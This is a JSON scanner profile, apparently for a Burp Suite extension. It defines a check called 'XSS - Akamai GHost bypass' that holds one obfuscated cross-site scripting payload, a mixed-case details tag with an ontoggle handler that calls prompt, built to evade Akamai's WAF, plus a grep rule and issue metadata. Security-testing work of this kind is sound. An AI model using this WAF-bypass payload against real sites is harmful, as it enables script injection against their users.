[{"Name":"XSS - Akamai GHost bypass",
"Active":false,
"Scanner":1,
"Author":"@egarme",
"Payloads":["\u003cdETAILS%0aopen%0aonToGgle%0a\u003d%0aa\u003dprompt,
\n\n\n\n\na() x\u003e"],
"Encoder":[],
"UrlEncode":false,
"CharsToUrlEncode":"",
"Grep":["\u003cdETAILS"],
"Tags":["XSS"],
"PayloadResponse":false,
"NotResponse":false,
"TimeOut":"",
"isTime":false,
"contentLength":"",
"iscontentLength":false,
"CaseSensitive":false,
"isReplace":false,
"Replace1":"",
"Replace2":"",
"ExcludeHTTP":true,
"OnlyHTTP":false,
"IsContentType":true,
"ContentType":"text/plain",
"NegativeCT":true,
"IsResponseCode":false,
"ResponseCode":"",
"NegativeRC":false,
"MatchType":1,
"RedirType":4,
"MaxRedir":5,
"spaceEncode":false,
"payloadPosition":1,
"sEncode":"",
"payloadsFile":"",
"grepsFile":"",
"IssueName":"XSS - Akamai GHost",
"IssueSeverity":"High",
"IssueConfidence":"Certain",
"IssueDetail":"XSS with payload from @s0md3v:   \u003cgrep\u003e",
"RemediationDetail":"",
"IssueBackground":"",
"RemediationBackground":""}]